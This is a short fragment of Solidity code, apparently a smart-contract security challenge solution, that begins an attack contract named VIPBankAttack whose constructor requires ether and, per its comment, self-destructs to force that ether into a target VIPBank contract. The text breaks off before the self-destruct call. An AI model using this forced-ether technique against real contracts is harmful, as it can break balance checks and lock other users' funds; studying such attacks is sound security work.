...
contract VIPBankAttack{

    constructor(address payable targetContract) payable {
        require(msg.value > 0.5 ether, "need more than 0.5 ether for the attack");

        // self destructing VIPBankAttack contract to forcefully send the 0.5 ether to the VIPBank contract
